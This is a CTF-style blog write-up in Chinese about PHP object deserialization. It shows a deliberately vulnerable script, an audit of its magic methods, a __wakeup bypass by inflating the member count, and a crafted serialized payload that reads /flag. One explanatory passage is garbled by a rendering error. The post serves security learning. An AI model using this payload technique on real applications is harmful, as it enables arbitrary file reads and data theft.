# 原创
：  魔术方法的触发在php反序列化中的应用

# 魔术方法的触发在php反序列化中的应用

**源码：**

```
&lt;?php
show_source(__FILE__);

class CDUTSEC1{
    public $file;
    public $function;

    function __construct($file, $function)
    {
        $this-&gt;file = $file;
        $this-&gt;function = $function;
    }
    function __wakeup()     // Hint：听说你们喜欢绕__wakeup，但是我可听说官方在php7.0.10之后修复了这个bug
    {
        $this-&gt;file = __FILE__;
        $this-&gt;function = 'phpversion';
    }
    function __invoke()
    {
        return file_get_contents($this-&gt;file);
    }
    function __toString()
    {
        return file_get_contents($this-&gt;file);
    }
    function __get($function)
    {
        return $this-&gt;function;
    }
    function __call($a, $b){
        return $this-&gt;function;
    }
}

class CDUTSEC2{
    public $function = 'phpversion';

    function __destruct()
    {
        echo ($this-&gt;function)();   //
    }
}

@unserialize($_GET['payload']);

```

**代码审计：**<br/> 能拿flag的方式只有CDUTSEC1中__invoke和__toString两个魔术方法，触发能够执行file_get_contents($this-&gt;file)。所以只要CDUTSEC1类的file值为’/flag’(当然可能不在当前目录，视题而定)就能拿到flag了。<br/> 两个魔术方法的触发条件:<br/> __invoke:当尝试以调用函数的方式调用一个对象时触发<br/> __toString:一个类被当做字符串时触发。用于一个类被当成字符串时应怎样回应。例如 echo KaTeX parse error: Expected group after '_' at position 37: …字符串，否则会产生错误。 所以_̲_toSring无法触发。审计…function的值再次序列化即可。<br/> 但CDUTSEC1中在触发__invoke之前因为反序列化__weakup先触发并把我们传入的$file覆盖，因此我们需要绕过__weakup。利用的漏洞也很简单，只需要把序列化字符串表示类成员数量的数字改大(大于实际数)即可绕过。本例中，改CDUTSEC2与嵌套的CDUTSEC1都可以。<br/> **解题：**

```
&lt;?php

class CDUTSEC1{
    public $file;
    public $function;
}

class CDUTSEC2{
    public $function = 'phpversion';
}

$tr = new CDUTSEC1();
$tr-&gt;file = '/flag';          
$sr = new CDUTSEC2();
$sr-&gt;function = $tr;
echo serialize($sr);

```

运行代码得到：`O:8:"CDUTSEC2":1:{s:8:"function";O:8:"CDUTSEC1":2:{s:4:"file";s:5:"/flag";s:8:"function";N;}}`，这里我们该大类成员数：`O:8:"CDUTSEC2":1:{s:8:"function";O:8:"CDUTSEC1":3:{s:4:"file";s:5:"/flag";s:8:"function";N;}}`即可。<br/> 测试payload：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210307191400632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
